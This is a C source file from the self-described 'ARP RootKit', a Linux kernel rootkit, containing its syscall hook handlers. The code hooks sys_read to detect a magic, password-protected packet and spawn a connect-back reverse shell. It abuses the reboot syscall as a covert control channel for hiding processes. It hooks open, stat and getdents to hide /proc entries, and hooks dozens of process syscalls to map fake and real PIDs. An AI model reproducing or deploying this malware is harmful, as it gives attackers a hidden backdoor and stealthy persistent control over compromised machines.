/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers and functions used on it.
 * This file is part of RK's Kernel.
 */

#include <linux/kmod.h>
#include <linux/prctl.h>
#include "hooks.h"
#include "kernel.h"
#include "arprk-conf.h"
#include "rshell.h"
#include "ctl.h"
#include "queue.h"

/* Network hidding hooks:
 * - Reverse shell by hooking sys_read
 *	- TODO: hook sys_recvfrom & sys_recv.
 * - TODO: network connections hidding.
 */
asmlinkage long my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage long my_read64(int fd, void *buf, size_t len) {
	char *ubuf = NULL;
	int nread = 0, *addr_len = NULL, ret = 0;
	struct rshell_req *req = NULL;
	struct sockaddr_in *addr = NULL;

	ubuf = alloc_umem(4096);
	addr = (struct sockaddr_in *) (ubuf + 2048);
	addr_len = (int *) (ubuf + 2048 + sizeof(struct sockaddr_in));
	if (ubuf != MAP_FAILED) {
		// MSG_KEEP is the key to keep the data in the queue.
		// then we can compare and serve it without doing a lot of work.
		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, 2048, MSG_PEEK, NULL, NULL);
		if (nread == sizeof(struct rshell_req)) {
			req = (struct rshell_req *) ubuf;
			if (f_memcmp(req->magic, RSHELL_MAGIC, sizeof(RSHELL_MAGIC)) == 0 && f_memcmp(req->password, RSHELL_PASSWORD, sizeof(RSHELL_PASSWORD)) == 0) {
				//f_printk("GOT RSHELL REQUEST\n");
				// if client didn't specify a connect-back IP, use the one from sys_recvmsg().
				if (!req->reverse.sin_addr.s_addr) {
					*addr_len = sizeof(struct sockaddr_in);
					ret = SYSCALL64(__NR_getpeername, fd, addr, addr_len, 0, 0, 0);
					//f_printk("ret = %d, *addr_len = %d, addr = %ld\n", ret, *addr_len, addr->sin_addr.s_addr);
					if (!ret && *addr_len == sizeof(struct sockaddr_in)) {
						req->reverse.sin_addr.s_addr = addr->sin_addr.s_addr;
						launch_shell(req->reverse);
					}
				} else {
					launch_shell(req->reverse);
				}
				// empty buffer
				nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(struct rshell_req), 0, 0, 0);
				if (nread == sizeof(struct rshell_req)) {
					free_umem(ubuf, 4096);
					return my_read64(fd, buf, len);
				}
				free_umem(ubuf, 4096);
			}
		}
		free_umem(ubuf, 4096);
	}

	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}

int launch_shell(struct sockaddr_in dest) {
	char *envp[] = { NULL }, *argv[] = { RSHELL_PATH, "255.255.255.255", "65535", NULL };
	int ret = 0;

	snprintf(argv[1], 16, "%pI4", &dest.sin_addr.s_addr);
	snprintf(argv[2], 6, "%hu", ntohs(dest.sin_port));
	//f_printk("addr = %s, port = %s\n", argv[1], argv[2]);
	ret = f_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	return ret;
}

/* RootKit control syscall:
 * - PID hidding & unhidding
 * - TODO: network hidding.
 * - TODO: sniffer.
 */
asmlinkage long my_reboot64(int magic1, int magic2, unsigned int cmd, void *arg) {
	if (magic1 == (int)ARPRK_CTL_MAGIC1 && magic2 == (int)ARPRK_CTL_MAGIC2 && cmd == (unsigned int)ARPRK_CTL_MAGIC3) {
		// at this point I think we're 99% we want to call the rootkit's control routine.
		return arprk_ctl(arg);
	} else {
		return SYSCALL64(__NR_reboot, magic1, magic2, cmd, arg, 0, 0);
	}
}

long arprk_ctl(struct arprk_ctl *ctl) {
    switch (ctl->cmd) {
        case ARPRK_CTLCMD_HIDE_PID:
            f_printk("HIDE PID request for %d\n", ctl->pid);
            hide_pid(ctl->pid);
            break;
        case ARPRK_CTLCMD_UNHIDE_PID:
            unhide_pid(ctl->pid);
            break;
        default:
            f_printk("unknown CTL CMD\n");
            break;
    }

    return 0;
}

/* PID hidding hooks:
 * - anti fork unhiding
 * - proc hidding
 * - whole process management API
 * - check if PID folder is directory (TODO: check if in mountpoint)
 */
int get_fd_path(int fd, char *path) {
	char *ubuf = NULL;
	long ret = 0;
	pid_t pid = 0;

	ubuf = alloc_umem(MAX_PATH);
	ret = pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
	if (pid) {
		snprintf(ubuf, MAX_PATH, "/proc/%d/fd/%d", pid, fd);
		ret = SYSCALL64(__NR_readlink, ubuf, path, MAX_PATH, 0, 0, 0);
		//if (ret >= 0) {
			//f_printk("fd %d ret %d ubuf %s path %s\n", fd, ret, ubuf, path);
		//}
	}
	free_umem(ubuf, MAX_PATH);
	return ret;
}

bool check_pid_in_path(int dfd, const char *path) {
	char *ubuf = NULL, *ubuf2 = NULL, *new_path = NULL;
	const char *p = NULL;
	size_t len = 0;
	pid_t pid = 0;
	unsigned long long ull = 0;
	off_t off = 0;
	struct stat *stat = NULL;
	long ret = 0;

	ubuf = alloc_umem(MAX_PATH);
	if (ubuf) {
		if (dfd != -1) {
			ret = get_fd_path(dfd, ubuf);
			if (ret >= 0) {
				//f_printk("path of %d is %s\n", dfd, ubuf);
				off = f_strlen(ubuf);
				ubuf[off++] = '/';
				ubuf[off] = 0;
			}
		}
		f_memcpy(ubuf + off, path, f_strlen(path));
		new_path = alloc_umem(MAX_PATH);
		f_memcpy(new_path, ubuf, f_strlen(ubuf));
		//f_printk("fd = %d, ubuf = %s\n", dfd, ubuf);
		f_strreplace(ubuf, '/', 0);
		p = ubuf;
		while (!p[len] && len < f_strlen(new_path) && len < 4096) {
			len++;
		}
		p += len;
		while ((len = f_strlen(p))) {
			f_kstrtoull(p, 10, &ull);
			pid = (pid_t) ull;
			//f_printk("checking pid %d - %s - %d - %s\n", pid, p, len, new_path);
			if (pid && pid_list_find(pid)) {
				// now we have a numeric entry which is in hidden pid list
				// but, to be sure it's a proc element, first we check if it's a directory.
				// so, we compose the path until the pid: <before_elements>/pid
				off = (long)memmem(new_path, f_strlen(new_path), p, len) - (long)new_path;
				off += len;
				if (off > 0) {
					ubuf2 = alloc_umem(MAX_PATH);
					if (ubuf2) {
						f_memcpy(ubuf2, new_path, off);
						ubuf2[off] = 0;
						stat = alloc_umem(sizeof(struct stat));
						if (stat) {
							ret = SYSCALL64(__NR_stat, ubuf2, stat, 0, 0, 0, 0);
							f_printk("new_path %s ubuf2 %s ret %d stat->st_mode %d stat %lx\n", new_path, ubuf2, ret, stat->st_mode, stat);
							if (!ret && S_ISDIR(stat->st_mode)) {
								//f_printk("ubuf2 %s\n", ubuf2);
								free_umem(new_path, MAX_PATH);
								free_umem(stat, sizeof(struct stat));
								free_umem(ubuf2, MAX_PATH);
								free_umem(ubuf, MAX_PATH);
								return true;
							}
							free_umem(stat, sizeof(struct stat));
						}
						free_umem(ubuf2, MAX_PATH);
					}
				}
			}
			p += len + 1;
		}
	free_umem(new_path, MAX_PATH);
        free_umem(ubuf, MAX_PATH);
    }
	return false;
}

asmlinkage long my_open64(const char *path, int flags, umode_t mode) {
	if (check_pid_in_path(-1, path)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_open, path, flags, mode, 0, 0, 0);
}

asmlinkage long my_openat64(int dfd, const char *path, int flags, umode_t mode) {
	if (check_pid_in_path(dfd, path)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_openat, dfd, path, flags, mode, 0, 0);
}

asmlinkage long my_getdents(long nr, unsigned int fd, void __user *dirent, unsigned int count) {
	long nread = 0;
	off_t off = 0, off_new = 0;
	void *ubuf = NULL, *ubuf_new = NULL;
	struct linux_dirent *e = NULL;

	ubuf = alloc_umem(count);
	ubuf_new = alloc_umem(count);
	if (ubuf) {
		nread = SYSCALL64(__NR_getdents, fd, ubuf, count, 0, 0, 0);
		for (off = 0, off_new = 0, e = ubuf; off < nread; off += e->d_reclen, e = ubuf + off) {
			//f_printk("nread %d %d %d\n", nread, off, e->d_reclen);
			if (!check_pid_in_path(fd, e->d_name)) {
				//f_printk("gentdents %s\n", e->d_name);
				f_memcpy(ubuf_new + off_new, ubuf + off, e->d_reclen);
				off_new += e->d_reclen;
			}
		}
		f_memcpy(dirent, ubuf_new, off_new);
		free_umem(ubuf, count);
		free_umem(ubuf_new, count);
		return off_new;
	}
	return SYSCALL64(nr, fd, dirent, count, 0, 0, 0);
}

asmlinkage long my_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	return my_getdents(__NR_getdents, fd, dirent, count);
}

asmlinkage long my_getdents6464(unsigned int fd, struct linux_dirent64 __user *dirent,	unsigned int count) {
	return my_getdents(__NR_getdents64, fd, dirent, count);
}

asmlinkage long my_stat64(const char __user *filename, struct stat __user *statbuf) {
	if (check_pid_in_path(-1, filename)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_stat, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_lstat64(const char __user * filename, struct stat __user *statbuf) {
	if (check_pid_in_path(-1, filename)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_lstat, filename, statbuf, 0, 0, 0, 0);
}
/*
asmlinkage long my_newstat64(const char __user *filename, struct stat __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_newstat, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_newlstat64(const char __user *filename, struct stat __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_newlstat, filename, statbuf, 0, 0, 0, 0);
}
*/
asmlinkage long my_newfstatat64(int dfd, const char __user *filename, struct stat __user *statbuf, int flag) {
	if (check_pid_in_path(-1, filename)) {
		return -ENOENT;
	}
	return SYSCALL64(__NR_newfstatat, dfd, filename, statbuf, flag, 0, 0);
}

/*
asmlinkage long my_stat6464(const char __user *filename, struct stat64 __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_stat64, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_lstat6464(const char __user *filename, struct stat64 __user *statbuf) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_lstat64, filename, statbuf, 0, 0, 0, 0);
}

asmlinkage long my_fstatat6464(int dfd, const char __user *filename, struct stat __user *statbuf, int flag) {
    if (check_pid_in_path(filename)) {
        return -ENOENT;
    }
    return SYSCALL64(__NR_fstatat64, dfd, filename, statbuf, flag, 0, 0);
}
*/

/* allocate memory in user-space process context */
void *alloc_umem(size_t len) {
	return (void *) SYSCALL64(__NR_mmap, 0, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
}

int free_umem(void *ptr, size_t len) {
	return SYSCALL64(__NR_munmap, ptr, len, 0, 0, 0, 0);
}

int hide_pid(pid_t nr) {
	struct pid *pid;

	pid = f_find_vpid(nr);
	if (pid) {
		if (pid_list_find(nr)) {
			perr("PID %d already hidden.\n", nr);
		} else {
			pid_list_push(nr);
			pinfo("PID %d is hidden.\n", nr);
			return 0;
		}
	} else {
		perr("PID %d not found.\n", nr);
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	if (pid_list_pop(nr) == nr) {
		pinfo("PID %d unhidden.\n", nr);

		return 0;
	} else {
		perr("PID %d is not hidden.\n", nr);
	}

	return -1;
}

pid_t last_pid = 0;

pid_t fake_new_process(pid_t pid) {
	struct pid_list_node *node = NULL;

	f_printk("fake_new_process pid before = %d\n", pid);
        last_pid = pid;
	// add fake <-> real if must
	node = pid_list_head;
        while (node) {
		if (last_pid <= node->nr && pid > node->nr) { // means that the kernel didn't give the hidden ID because it's in use, and it's hidden.
			fid_list_del_real(node->nr); // delete previous, if the pid counter overflows...
			fid_list_add(node->nr, pid);
			f_printk("fake_new_process pid after = %d (found hidden)\n", node->nr);
			return node->nr;
		}
		node = node->next;
	}
	// the PID returned is before hidden pid. Or after last_pid, and hidden pid is before last_pid
	// so now, we want to know if we must fake this id. If there's a (ret - 1) = real (tail), then we must fake it.
	if (fid_list_tail->real == (pid - 1)) {
		fid_list_del_real(pid - 1);
		fid_list_add(fid_list_tail->real, pid); // now real is fake
		f_printk("fake_new_process pid after = %d (redirecting)\n", fid_list_tail->fake);
		return fid_list_tail->fake;
	}
	f_printk("fake_new_process pid after = %d\n", pid);
	return pid;
}

asmlinkage long my_fork64(void) {
	pid_t pid = 0;

	pid = SYSCALL64(__NR_fork, 0, 0, 0, 0, 0, 0);
	pid = fake_new_process(pid);
	return pid;
}
/*
asm(
".globl my_clone64\n\t"
".type my_clone64, @function\n"
"my_clone64:\n\t"
//"mov sys_call_table(%rip), %rcx\n\t"
//"add $448, %rcx\n\t"
//"jmp *(%rcx)\n\t"
//"mov sys_call_table(%rip), %rax\n\t"
"push %rbp\n\t"
"mov %rsp, %rbp\n\t"
"mov sys_call_table(%rip), %rax\n\t"
"add $448, %rax\n\t"
"call *(%rax)\n\t"
"leave\n\t"
"ret\n\t"
".size my_clone64, .-my_clone64\n\t"
);
*/
asmlinkage long my_vfork64(void) {
	pid_t pid = 0;
	//asmlinkage long (*f)(void) = sys_call_table[__NR_vfork];
	//long addr = (long)sys_call_table[__NR_vfork];
	//f_printk("%lx\n", addr);
	//pid = f();
	pid = SYSCALL64(__NR_vfork, 0, 0, 0, 0, 0, 0);
	pid = fake_new_process(pid);
	return pid;
}

asmlinkage long my_clone64(long a1, long a2, long a3, long a4, long a5, long a6) {
        pid_t pid = 0;

	f_printk("%lx %lx %lx %lx %lx %lx\n", a1, a2, a3, a4, a5, a6);
	pid = SYSCALL64(__NR_clone, a1, a2, a3, a4, a5, a6);
	//pid = fake_new_process(pid);
        return pid;
}

asmlinkage long my_getpid64(void) {
	pid_t pid = 0;

	pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
	pid = fid_list_real_to_fake(pid);
	return pid;
}

asmlinkage long my_gettid64(void) {
	pid_t tid = 0;
	pid_t pid = 0;

	// we compute the fake tid, in base of the real tid, pid and fake pid
	tid = SYSCALL64(__NR_gettid, 0, 0, 0, 0, 0, 0);
	pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
	tid = fid_list_real_to_fake(pid) + (tid - pid);
	return tid;
}

asmlinkage long my_getppid64(void) {
	pid_t pid = 0;

	pid = SYSCALL64(__NR_getppid, 0, 0, 0, 0, 0, 0);
	pid = fid_list_real_to_fake(pid);
	return pid;
}

asmlinkage long my_wait464(int *status) {
	pid_t pid = 0;

	pid = SYSCALL64(__NR_wait4, status,  0, 0, 0, 0, 0);
	pid = fid_list_real_to_fake(pid);
	return pid;
}

asmlinkage long my_waitid64(idtype_t type, id_t id, siginfo_t *infop, int options) {
	long ret = 0;

	if (id == P_PID || id == P_PGID) {
		id = fid_list_fake_to_real(id);
	}

	ret = SYSCALL64(__NR_waitid, type, id, infop, options, 0, 0);
	if ((long)infop > 0) {
		infop->si_pid = fid_list_real_to_fake(infop->si_pid);
	}
	return ret;
}

asmlinkage long my_kill64(pid_t pid, int sig) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_kill, pid, sig, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_getpgid64(pid_t pid) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_getpgid, pid, 0, 0, 0, 0, 0);
	ret = fid_list_real_to_fake(ret);
	return ret;
}

asmlinkage long my_setpgid64(pid_t pid, pid_t pgid) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	pgid = fid_list_fake_to_real(pgid);
	ret = SYSCALL64(__NR_setpgid, pid, pgid, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_getpgrp64(void) {
	long ret = 0;

	ret = SYSCALL64(__NR_getpgrp, 0, 0, 0, 0, 0, 0);
	ret = fid_list_real_to_fake(ret);
	return ret;
}

asmlinkage long my_getsid64(pid_t pid) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_getsid, pid, 0, 0, 0, 0, 0);
	ret = fid_list_real_to_fake(ret);
	return ret;
}

asmlinkage long my_setsid64(void) {
	long ret = 0;

	ret = SYSCALL64(__NR_setsid, 0, 0, 0, 0, 0, 0);
	ret = fid_list_real_to_fake(ret);
	return ret;
}

asmlinkage long my_tkill64(pid_t tid, int sig) {
	long ret = 0;

	tid = fid_list_fake_to_real(tid);
	ret = SYSCALL64(__NR_tkill, tid, sig, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_tgkill64(pid_t tgid, pid_t tid, int sig) {
	long ret = 0;
	pid_t pid = 0;

	tgid = fid_list_fake_to_real(tgid);
	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_tgkill, tgid, pid, sig, 0, 0, 0);
	return ret;
}

asmlinkage long my_ptrace64(long request, pid_t pid, unsigned long addr, unsigned long data) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_ptrace, request, pid, addr, data, 0, 0);
	return ret;
}

asmlinkage long my_rt_sigqueueinfo64(pid_t pid, int sig, siginfo_t *uinfo) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_rt_sigqueueinfo, pid, sig, uinfo, 0, 0, 0);
	if ((long)uinfo > 0) {
		uinfo->si_pid = fid_list_real_to_fake(uinfo->si_pid);
	}
	return ret;
}

asmlinkage long my_rt_tgsigqueueinfo64(pid_t tgid, pid_t pid, int sig, siginfo_t *uinfo) {
	long ret = 0;

	tgid = fid_list_fake_to_real(tgid);
	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_rt_tgsigqueueinfo, tgid, pid, sig, uinfo, 0, 0);
	if ((long)uinfo > 0) {
		uinfo->si_pid = fid_list_real_to_fake(uinfo->si_pid);
	}
	return ret;
}

asmlinkage long my_sched_setparam64(pid_t pid, struct sched_param *param) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_setparam, pid, param, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_getparam64(pid_t pid, struct sched_param *param) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_getparam, pid, param, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_setscheduler64(pid_t pid, int policy, struct sched_param *param) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_setscheduler, pid, policy, param, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_getscheduler64(pid_t pid) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_getscheduler, pid, 0, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_rr_get_interval64(pid_t pid, struct timespec *interval) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_rr_get_interval, pid, interval, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_setaffinity64(pid_t pid, unsigned int len, unsigned long *user_mask_ptr) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_setaffinity, pid, len, user_mask_ptr, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_getaffinity64(pid_t pid, unsigned int len, unsigned long *user_mask_ptr) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_getaffinity, pid, len, user_mask_ptr, 0, 0, 0);
	return ret;
}

asmlinkage long my_migrate_pages64(pid_t pid, unsigned long maxnode, const unsigned long *old_nodes, const unsigned long *new_nodes) {
	long ret = 0;

        pid = fid_list_fake_to_real(pid);
        ret = SYSCALL64(__NR_migrate_pages, pid, maxnode, old_nodes, new_nodes, 0, 0);
        return ret;
}

asmlinkage long my_move_pages64(pid_t pid, unsigned long nr_pages, const void **pages, const int *nodes, int *status, int flags) {
        long ret = 0;

        pid = fid_list_fake_to_real(pid);
        ret = SYSCALL64(__NR_move_pages, pid, nr_pages, pages, nodes, status, flags);
        return ret;
}

/* TODO: study and implement wirte & read filtering */
asmlinkage long my_perf_event_open64(struct perf_event_attr *attr_uptr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
	long ret = 0;

	if (!(flags & PERF_FLAG_PID_CGROUP)) { // TODO: is "test" implicitly the name or is an example in manual?
		pid = fid_list_fake_to_real(pid);
	}
	ret = SYSCALL64(__NR_perf_event_open, attr_uptr, pid, cpu, group_fd, flags, 0);
	return ret;
}

asmlinkage long my_prlimit6464(pid_t pid, unsigned int resource, const struct rlimit64 *new_rlim, struct rlimit64 *old_rlim) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_prlimit64, pid, resource, new_rlim, old_rlim, 0, 0);
	return ret;
}

asmlinkage long my_process_vm_readv64(pid_t pid, const struct iovec *lvec, unsigned long liovcnt, const struct iovec *rvec, unsigned long riovcnt, unsigned long flags) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_process_vm_readv, pid, lvec, liovcnt, rvec, riovcnt, flags);
	return ret;
}

asmlinkage long my_process_vm_writev64(pid_t pid, const struct iovec *lvec, unsigned long liovcnt, const struct iovec *rvec, unsigned long riovcnt, unsigned long flags) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_process_vm_writev, pid, lvec, liovcnt, rvec, riovcnt, flags);
	return ret;
}

asmlinkage long my_kcmp64(pid_t pid1, pid_t pid2, int type, unsigned long idx1, unsigned long idx2) {
	long ret = 0;

	pid1 = fid_list_fake_to_real(pid1);
	pid2 = fid_list_fake_to_real(pid2);
	ret = SYSCALL64(__NR_kcmp, pid1, pid2, type, idx1, idx2, 0);
	return ret;
}

asmlinkage long my_sched_setattr64(pid_t pid, struct sched_attr __user *attr, unsigned int flags) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_sched_setattr, pid, attr, flags, 0, 0, 0);
	return ret;
}

asmlinkage long my_sched_getattr64(pid_t pid, struct sched_attr __user *attr, unsigned int size, unsigned int flags) {
        long ret = 0;

        pid = fid_list_fake_to_real(pid);
        ret = SYSCALL64(__NR_sched_getattr, pid, attr, size, flags, 0, 0);
        return ret;
}

asmlinkage long my_get_robust_list64(pid_t pid, struct robust_list_head **head_ptr, size_t *len_ptr) {
	long ret = 0;

	pid = fid_list_fake_to_real(pid);
	ret = SYSCALL64(__NR_get_robust_list, pid, head_ptr, len_ptr, 0, 0, 0);
	return ret;
}

asmlinkage long my_getpriority64(int which, id_t who) {
	long ret = 0;

	if (which == PRIO_PROCESS || which == PRIO_PGRP) {
		who = fid_list_fake_to_real(who);
	}
	ret = SYSCALL64(__NR_getpriority, which, who, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_setpriority64(int which, id_t who, int prio) {
        long ret = 0;

        if (which == PRIO_PROCESS || which == PRIO_PGRP) {
                who = fid_list_fake_to_real(who);
        }
        ret = SYSCALL64(__NR_setpriority, which, who, prio, 0, 0, 0);
        return ret;
}

asmlinkage long my_ioprio_get64(int which, int who) {
	long ret = 0;

	if (which == IOPRIO_WHO_PROCESS || which == IOPRIO_WHO_PGRP) {
		who = fid_list_fake_to_real(who);
	}
	ret = SYSCALL64(__NR_ioprio_get, which, who, 0, 0, 0, 0);
	return ret;
}

asmlinkage long my_ioprio_set64(int which, int who, int ioprio) {
	long ret = 0;

	if (which == IOPRIO_WHO_PROCESS || which == IOPRIO_WHO_PGRP) {
                who = fid_list_fake_to_real(who);
        }
	ret = SYSCALL64(__NR_ioprio_set, which, who, ioprio, 0, 0, 0);
        return ret;
}

asmlinkage long my_capget64(cap_user_header_t hdrp, cap_user_data_t datap) {
	long ret = 0;

	hdrp->pid = fid_list_fake_to_real(hdrp->pid);
	ret = SYSCALL64(__NR_capget, hdrp, datap, 0, 0, 0, 0);
	hdrp->pid = fid_list_real_to_fake(hdrp->pid);
	return ret;
}

asmlinkage long my_capset64(cap_user_header_t hdrp, const cap_user_data_t datap) {
	long ret = 0;

        hdrp->pid = fid_list_fake_to_real(hdrp->pid);
        ret = SYSCALL64(__NR_capset, hdrp, datap, 0, 0, 0, 0);
        hdrp->pid = fid_list_real_to_fake(hdrp->pid);
        return ret;
}

asmlinkage long my_set_tid_address64(int *tidptr) {
	long ret = 0;

	ret = SYSCALL64(__NR_set_tid_address, tidptr, 0, 0, 0, 0, 0);
	ret = fid_list_real_to_fake(ret);
	return ret;
}

asmlinkage long my_seccomp64(unsigned int operation, unsigned int flags, void *args) {
	long ret = 0;

	ret = SYSCALL64(__NR_seccomp, operation, flags, args, 0, 0, 0);
	if (flags & SECCOMP_FILTER_FLAG_TSYNC) {
		ret = fid_list_real_to_fake(ret);
	}
	return ret;
}

asmlinkage long my_prctl64(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
	long ret = 0;

	if (option == PR_SET_PTRACER) {
		arg2 = fid_list_fake_to_real(arg2);
	}
	ret = SYSCALL64(__NR_prctl, option, arg2, arg3, arg3, arg5, 0);
	return ret;
}
